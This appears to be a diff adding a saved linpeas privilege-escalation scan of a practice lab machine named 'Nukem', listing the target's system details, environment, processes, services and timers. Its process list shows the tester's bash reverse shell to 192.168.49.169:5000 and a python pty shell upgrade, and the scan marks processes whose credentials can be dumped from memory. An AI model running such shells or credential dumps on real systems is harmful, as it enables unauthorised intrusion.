@@ -1,0 +1,1713 @@
+root@kali:~/CTF/PGPractice/Nukem/PE# cat linpeas.txt
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v3.2.0 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+════════════════════════════════════╣ Basic information ╠════════════════════════════════════
+OS: Linux version 5.8.9-arch2-1 (linux@archlinux) (gcc (GCC) 10.2.0, GNU ld (GNU Binutils) 2.35) #1 SMP PREEMPT Sun, 13 Sep 2020 23:44:55 +0000
+User & Groups: uid=33(http) gid=33(http) groups=33(http)
+Hostname: nukem
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[-] No port scan capabilities (nc not found)
+
+
+Caching directories using 1 threads DONE
+
+════════════════════════════════════╣ System Information ╠════════════════════════════════════
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 5.8.9-arch2-1 (linux@archlinux) (gcc (GCC) 10.2.0, GNU ld (GNU Binutils) 2.35) #1 SMP PREEMPT Sun, 13 Sep 2020 23:44:55 +0000
+LSB Version:    1.4
+Distributor ID: Arch
+Description:    Arch Linux
+Release:        rolling
+Codename:       n/a
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.9.3p1
+
+[+] USBCreator
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/local/sbin:/usr/local/bin:/usr/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/sbin:/bin
+
+[+] Date
+Sat Jun  5 10:56:31 UTC 2021
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda2       9.3G  4.8G  4.1G  54% /
+dev             985M     0  985M   0% /dev
+tmpfs           992M  452K  992M   1% /dev/shm
+tmpfs           4.0M     0  4.0M   0% /sys/fs/cgroup
+run             992M  636K  992M   1% /run
+tmpfs           992M     0  992M   0% /tmp
+/dev/sda1       511M  144K  511M   1% /boot/efi
+tmpfs           199M   24K  199M   1% /run/user/1000
+tmpfs           199M   20K  199M   1% /run/user/974
+              total        used        free      shared  buff/cache   available
+Mem:        2031040      383536      184888        4800     1462616     1454692
+Swap:             0           0           0
+
+[+] CPU info
+Architecture:                    x86_64
+CPU op-mode(s):                  32-bit, 64-bit
+Byte Order:                      Little Endian
+Address sizes:                   43 bits physical, 48 bits virtual
+CPU(s):                          1
+On-line CPU(s) list:             0
+Thread(s) per core:              1
+Core(s) per socket:              1
+Socket(s):                       1
+NUMA node(s):                    1
+Vendor ID:                       AuthenticAMD
+CPU family:                      23
+Model:                           1
+Model name:                      AMD EPYC 7371 16-Core Processor
+Stepping:                        2
+CPU MHz:                         3094.187
+BogoMIPS:                        6190.22
+Hypervisor vendor:               VMware
+Virtualization type:             full
+L1d cache:                       32 KiB
+L1i cache:                       64 KiB
+L2 cache:                        512 KiB
+L3 cache:                        64 MiB
+NUMA node0 CPU(s):               0
+Vulnerability Itlb multihit:     Not affected
+Vulnerability L1tf:              Not affected
+Vulnerability Mds:               Not affected
+Vulnerability Meltdown:          Not affected
+Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl and seccomp
+Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization
+Vulnerability Spectre v2:        Mitigation; Full AMD retpoline, IBPB conditional, STIBP disabled, RSB filling
+Vulnerability Srbds:             Not affected
+Vulnerability Tsx async abort:   Not affected
+Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?
+SHELL=bash
+HISTSIZE=0
+PWD=/dev/shm
+LS_OPTIONS=--color=auto
+LANG=en_US.UTF-8
+HISTFILE=/dev/null
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+INVOCATION_ID=6817f5f1fa2d4629b9550a2fe3c35420
+TERM=xterm
+SHLVL=3
+JOURNAL_STREAM=8:15832
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/sbin:/bin
+HISTFILESIZE=0
+OLDPWD=/home/commander
+_=/usr/bin/env
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. /etc/apparmor.d
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a virtual machine? ..... Yes (vmware)
+
+═════════════════════════════════════════╣ Containers ╠══════════════════════════════════════════
+[+] Is this a container? ........... No
+
+[+] Container related tools present
+[+] Any running containers? ........ No
+
+═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+
+UUID=90d32f98-91f8-4e78-97b3-6f8a29b599af       /               ext4            rw,relatime     0 1
+
+UUID=58FB-C1B1          /boot/efi       vfat            rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro  0 2
+
+
+
+════════════════════════════════════╣ Available Software ╠════════════════════════════════════
+[+] Useful software
+
+[+] Installed Compiler
+
+
+══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+root           1  0.0  0.5 110216 11668 ?        Ss   08:04   0:00 /sbin/init
+root         214  1.6  9.8 318348 199644 ?       Ss   08:04   2:53 /usr/lib/systemd/systemd-journald
+root         224  0.0  0.4  33152  9088 ?        Ss   08:04   0:00 /usr/lib/systemd/systemd-udevd
+dbus         257  0.0  0.2   7700  4592 ?        Ss   08:04   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root         259  0.0  0.4  19172  9240 ?        Ss   08:04   0:00 /usr/lib/systemd/systemd-logind
+root         260  0.0  0.3 233788  7588 ?        Ssl  08:04   0:06 /usr/bin/vmtoolsd
+root         348  0.0  1.1  74076 22408 ?        Ss   08:04   0:00 /usr/bin/httpd -k start -DFOREGROUND
+http       10782  0.0  0.6  74452 13296 ?        S    10:44   0:00  _ /usr/bin/httpd -k start -DFOREGROUND
+http       11164  0.0  0.1   4164  2868 ?        S    10:47   0:00  |   _ bash -c bash -i >& /dev/tcp/192.168.49.169/5000 0>&1
+http       11165  0.0  0.1   4428  3684 ?        S    10:47   0:00  |       _ bash -i
+http       11382  0.0  0.3   9832  7628 ?        S    10:49   0:00  |           _ python -c import pty; pty.spawn("/bin/bash")
+http       11383  0.0  0.1   4428  3748 pts/0    Ss   10:49   0:00  |               _ /bin/bash
+http       12002  0.5  0.2   5116  4096 pts/0    S+   10:56   0:00  |                   _ /bin/sh ./linpeas.sh -a
+http       12689  0.0  0.1   5116  2524 pts/0    S+   10:56   0:00  |                   |   _ /bin/sh ./linpeas.sh -a
+http       12693  0.0  0.1   6768  2872 pts/0    R+   10:56   0:00  |                   |   |   _ ps fauxwww
+http       12692  0.0  0.0   5116  1324 pts/0    S+   10:56   0:00  |                   |   _ /bin/sh ./linpeas.sh -a
+http       12003  0.0  0.0   2364   716 pts/0    S+   10:56   0:00  |                   _ tee linpeas.txt
+http       10916  0.0  0.4  74452  8372 ?        S    10:45   0:00  _ /usr/bin/httpd -k start -DFOREGROUND
+http       10981  0.0  0.4  74452  8372 ?        S    10:45   0:00  _ /usr/bin/httpd -k start -DFOREGROUND
+http       11004  0.0  0.4  74452  8372 ?        S    10:46   0:00  _ /usr/bin/httpd -k start -DFOREGROUND
+http       11060  0.0  0.4  74452  8372 ?        S    10:46   0:00  _ /usr/bin/httpd -k start -DFOREGROUND
+http       11167  0.0  0.4  74452  8372 ?        S    10:47   0:00  _ /usr/bin/httpd -k start -DFOREGROUND
+root         356  0.0  0.3 231300  6748 ?        Ssl  08:04   0:00 /usr/bin/lightdm
+root         368  0.0  2.7 183940 56492 tty7     Ss+  08:04   0:00  _ /usr/lib/Xorg :0 -seat seat0 -auth /run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+root         425  0.0  0.3 160256  7588 ?        Sl   08:04   0:00  _ lightdm --session-child 18 21
+lightdm      439  0.0  3.5 415540 72236 ?        Ssl  08:04   0:01  |   _ /usr/bin/lightdm-gtk-greeter
+root         489  0.0  0.2  12868  5968 ?        S    08:04   0:00  _ lightdm --session-child 14 21
+root         362  0.0  0.1   5888  3260 ?        Ss   08:04   0:00 /usr/bin/vncsession commander :1
+command+     389  0.0  0.0   3876  1144 ?        S    08:04   0:00  _ xinit /etc/lightdm/Xsession startxfce4 -- /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
+command+     402  0.0  3.6 199492 74296 ?        S    08:04   0:00      _ /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
+command+     416  0.0  2.9 405180 59700 ?        Sl   08:04   0:00      _ xfce4-session
+command+     487  0.0  4.1 352512 83928 ?        Sl   08:04   0:00          _ xfwm4
+command+     499  0.0  1.4 261564 29952 ?        Sl   08:04   0:00          _ xfce4-panel
+command+     513  0.0  1.0 182632 21572 ?        Sl   08:04   0:00          |   _ /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libsystray.so 6 12582920 systray Notification Area Area where notification icons appear
+command+     514  0.0  1.3 185776 27516 ?        Sl   08:04   0:00          |   _ /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libxfce4powermanager.so 9 12582921 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display
+command+     515  0.0  1.1 184488 23984 ?        Sl   08:04   0:00          |   _ /usr/lib/xfce4/panel/wrapper-2.0 /usr/lib/xfce4/panel/plugins/libactions.so 14 12582922 actions Action Buttons Log out, lock or other system actions
+command+     505  0.0  1.0 331480 22048 ?        Sl   08:04   0:00          _ Thunar --daemon[0m
+command+     510  0.0  1.6 265828 33980 ?        Sl   08:04   0:00          _ xfdesktop
+command+     531  0.0  1.0 182012 20312 ?        Sl   08:04   0:00          _ /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1
+command+     379  0.0  0.5  20468 10420 ?        Ss   08:04   0:00 /usr/lib/systemd/systemd --user
+command+     380  0.0  0.1  31924  2836 ?        S    08:04   0:00  _ (sd-pam)
+command+     420  0.0  0.2   7236  4284 ?        Ss   08:04   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+command+     449  0.0  0.3 304152  6420 ?        Ssl  08:04   0:00  _ /usr/lib/at-spi-bus-launcher
+command+     455  0.0  0.1   7092  3948 ?        S    08:04   0:00  |   _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+command+     459  0.0  0.2 229180  5744 ?        Sl   08:04   0:00  _ /usr/lib/xfce4/xfconf/xfconfd
+command+     469  0.0  0.3 160720  7300 ?        Sl   08:04   0:00  _ /usr/lib/at-spi2-registryd --use-gnome-session
+command+     485  0.0  0.0 151796  1276 ?        SLs  08:04   0:00  _ /usr/bin/gpg-agent --supervised
+mysql        387  0.0  4.3 633720 87940 ?        Ssl  08:04   0:04 /usr/bin/mariadbd
+lightdm      432  0.0  0.5  20340 10176 ?        Ss   08:04   0:00 /usr/lib/systemd/systemd --user
+lightdm      433  0.0  0.1  31924  2912 ?        S    08:04   0:00  _ (sd-pam)
+lightdm      441  0.0  0.1   6960  3696 ?        Ss   08:04   0:00  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+lightdm      442  0.0  0.3 304152  6100 ?        Ssl  08:04   0:00  _ /usr/lib/at-spi-bus-launcher
+lightdm      448  0.0  0.1   6960  3488 ?        S    08:04   0:00  |   _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+lightdm      492  0.0  0.2 160580  5980 ?        Sl   08:04   0:00  _ /usr/lib/at-spi2-registryd --use-gnome-session
+polkitd      470  0.0  1.0 2569796 20540 ?       Ssl  08:04   0:00 /usr/lib/polkit-1/polkitd --no-debug
+command+     482  0.0  0.0   5892   448 ?        Ss   08:04   0:00 /usr/bin/ssh-agent -s
+command+     498  0.0  0.9 218104 19584 ?        Ssl  08:04   0:00 xfsettingsd
+root         523  0.0  0.4 312332  9016 ?        Ssl  08:04   0:00 /usr/lib/upowerd
+command+     527  0.0  1.0  39432 21908 ?        S    08:04   0:06 /usr/bin/vmtoolsd -n vmusr
+command+     537  0.0  0.9 182980 18684 ?        Ssl  08:04   0:00 xfce4-power-manager
+root         553  0.1  1.6 472188 34020 ?        Ss   08:06   0:14 /usr/bin/python /home/commander/python_rest_flask/server.py
+root         554  0.0  1.3  85568 27464 ?        Ss   08:06   0:00 /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+root         558  0.0  0.4  83328  9544 ?        S    08:06   0:00  _ /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+root         559  0.0  0.2  83336  5956 ?        S    08:06   0:00  _ /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+root         560  0.0  0.4  85552  9880 ?        S    08:06   0:00  _ /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+root        3978  0.0  0.8  94508 17240 ?        S    09:45   0:00  _ /usr/bin/smbd --foreground --no-process-group -p36445 ## Type: string ## Default: ## ServiceRestart: nmb NMBDOPTIONS= ## Type: string ## Default: ## ServiceRestart: winbind WINBINDOPTIONS=
+root         555  0.0  0.0   9132  1092 ?        Ss   08:06   0:00 nginx: master process /usr/bin/nginx -g pid /run/nginx.pid; error_log stderr;
+http         556  1.8  0.2   9916  4388 ?        S    08:06   3:05  _ nginx: worker process
+systemd+     596  0.0  0.4  19388  8224 ?        Ss   08:07   0:00 /usr/lib/systemd/systemd-networkd
+  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root   928016 Aug  9  2020 /bin/bash
+lrwxrwxrwx 1 root root        4 Aug  9  2020 /bin/sh -> bash
+lrwxrwxrwx 1 root root       22 Sep 13  2020 /sbin/init -> ../lib/systemd/systemd
+-rwxr-xr-x 1 root root  2637816 Sep 11  2020 /usr/bin/Xvnc
+-rwxr-xr-x 1 root root   223472 Jul  2  2020 /usr/bin/dbus-daemon
+-rwxr-xr-x 1 root root   418464 Sep  3  2020 /usr/bin/gpg-agent
+-rwxr-xr-x 1 root root   658624 Aug 21  2020 /usr/bin/httpd
+-rwxr-xr-x 1 root root   272216 Aug 14  2020 /usr/bin/lightdm
+-rwxr-xr-x 1 root root   137184 Jul  4  2020 /usr/bin/lightdm-gtk-greeter
+-rwxr-xr-x 1 root root 23661920 Aug 20  2020 /usr/bin/mariadbd
+lrwxrwxrwx 1 root root        7 Sep  5  2020 /usr/bin/python -> python3
+-rwxr-xr-x 1 root root   108568 Aug 14  2020 /usr/bin/smbd
+-rwxr-xr-x 1 root root   341904 Aug 30  2020 /usr/bin/ssh-agent
+-rwxr-xr-x 1 root root    59544 Aug 20  2020 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root    18200 Sep 11  2020 /usr/bin/vncsession
+-rwxr-xr-x 1 root root  2379488 Sep  2  2020 /usr/lib/Xorg
+-rwxr-xr-x 1 root root    26448 Sep  5  2020 /usr/lib/at-spi-bus-launcher
+-rwxr-xr-x 1 root root    76080 Sep  5  2020 /usr/lib/at-spi2-registryd
+-rwxr-xr-x 1 root root   133544 Aug  3  2020 /usr/lib/polkit-1/polkitd
+-rwxr-xr-x 1 root root    42760 Jul  7  2020 /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1
+-rwxr-xr-x 1 root root  1640496 Sep 13  2020 /usr/lib/systemd/systemd
+-rwxr-xr-x 1 root root   149336 Sep 13  2020 /usr/lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   260056 Sep 13  2020 /usr/lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root  1066912 Sep 13  2020 /usr/lib/systemd/systemd-networkd
+lrwxrwxrwx 1 root root       17 Sep 13  2020 /usr/lib/systemd/systemd-udevd -> ../../bin/udevadm
+-rwxr-xr-x 1 root root   255824 Jun 17  2020 /usr/lib/upowerd
+-rwxr-xr-x 1 root root    30488 Apr 28  2020 /usr/lib/xfce4/panel/wrapper-2.0
+-rwxr-xr-x 1 root root    96104 May  6  2020 /usr/lib/xfce4/xfconf/xfconfd
+
+[+] Files opened by processes belonging to other users
+[i] This is usually empty because of the lack of privileges to read other user processes information
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm process found (dump creds from memory as root)
+vsftpd Not Found
+apache2 Not Found
+sshd: process found (dump creds from memory as root)
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+crontab Not Found
+incrontab Not Found
+
+[+] Services
+[i] Search for outdated versions
+service|chkconfig|rc-status|launchctl Not Found
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/lib/systemd/system/initrd-cleanup.service is executing some relative path
+/lib/systemd/system/initrd-parse-etc.service is executing some relative path
+/lib/systemd/system/initrd-switch-root.service is executing some relative path
+/lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-firstboot.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-journal-catalog-update.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path
+/lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path
+/lib/systemd/system/systemd-ask-password-console.service is executing some relative path
+/lib/systemd/system/systemd-ask-password-wall.service is executing some relative path
+/lib/systemd/system/systemd-boot-system-token.service is executing some relative path
+/lib/systemd/system/systemd-firstboot.service is executing some relative path
+/lib/systemd/system/systemd-halt.service is executing some relative path
+/lib/systemd/system/systemd-hwdb-update.service is executing some relative path
+/lib/systemd/system/systemd-journal-catalog-update.service is executing some relative path
+/lib/systemd/system/systemd-journal-flush.service is executing some relative path
+/lib/systemd/system/systemd-kexec.service is executing some relative path
+/lib/systemd/system/systemd-machine-id-commit.service is executing some relative path
+/lib/systemd/system/systemd-nspawn@.service is executing some relative path
+/lib/systemd/system/systemd-sysusers.service is executing some relative path
+/lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path
+/lib/systemd/system/systemd-udev-settle.service is executing some relative path
+/lib/systemd/system/systemd-udev-trigger.service is executing some relative path
+/lib/systemd/system/systemd-udevd.service is executing some relative path
+/lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path
+/lib/systemd/user/systemd-tmpfiles-setup.service is executing some relative path
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                        LEFT     LAST                        PASSED       UNIT                         ACTIVATES
+Sun 2021-06-06 00:00:00 UTC 13h left Sat 2021-06-05 08:07:04 UTC 2h 50min ago man-db.timer                 man-db.service
+Sun 2021-06-06 00:00:00 UTC 13h left Sat 2021-06-05 08:07:04 UTC 2h 50min ago shadow.timer                 shadow.service
+Sun 2021-06-06 08:20:24 UTC 21h left Sat 2021-06-05 08:20:24 UTC 2h 37min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                             PID PROCESS         USER            CONNECTION    UNIT                     SESSION DESCRIPTION
+:1.0                               1 systemd         root            :1.0          init.scope               -       -
+:1.1                             259 systemd-logind  root            :1.1          systemd-logind.service   -       -
+:1.13                            432 systemd         lightdm         :1.13         user@974.service         -       -
+:1.14                            416 xfce4-session   commander       :1.14         session-1.scope          1       -
+:1.15                            470 polkitd         polkitd         :1.15         polkit.service           -       -
+:1.16                            439 lightdm-gtk-gre lightdm         :1.16         session-c1.scope         c1      -
+:1.17                            514 panel-9-power-m commander       :1.17         session-1.scope          1       -
+:1.18                            537 xfce4-power-man commander       :1.18         session-1.scope          1       -
+:1.20                            531 polkit-gnome-au commander       :1.20         session-1.scope          1       -
+:1.21                            523 upowerd         root            :1.21         upower.service           -       -
+:1.22                            554 smbd            root            :1.22         smb.service              -       -
+:1.23                            596 systemd-network systemd-network :1.23         systemd-networkd.service -       -
+:1.3                             356 lightdm         root            :1.3          lightdm.service          -       -
